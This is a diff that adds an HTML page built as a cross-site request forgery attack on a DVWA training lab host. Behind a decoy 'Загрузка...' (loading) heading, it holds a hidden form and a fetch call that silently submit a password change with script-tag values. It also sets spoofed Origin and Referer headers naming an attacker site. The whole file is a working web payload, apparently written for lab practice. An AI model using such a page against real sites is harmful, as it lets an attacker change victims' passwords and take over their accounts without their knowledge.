@@ -1,0 +1,21 @@
+<html>
+  <body>
+    <h3>Загрузка...</h3>
+    <form id="csrfForm" action="http://dvwa.cloudnetworks.local/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="<script>alert('csrf')</script>">
+      <input type="hidden" name="password_conf" value="<script>alert('csrf')</script>">
+    </form>
+
+    <script>
+      fetch("http://dvwa.cloudnetworks.local/vulnerabilities/csrf/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": "http://evilsite.attacker",
+          "Referer": "http://evilsite.attacker/form.html"
+        },
+        body: "password_new=%3Cscript%3Ealert('csrf')%3C%2Fscript%3E&password_conf=%3Cscript%3Ealert('csrf')%3C%2Fscript%3E"
+      }).then(r => console.log("sent", r.status));
+    </script>
+  </body>
+</html>
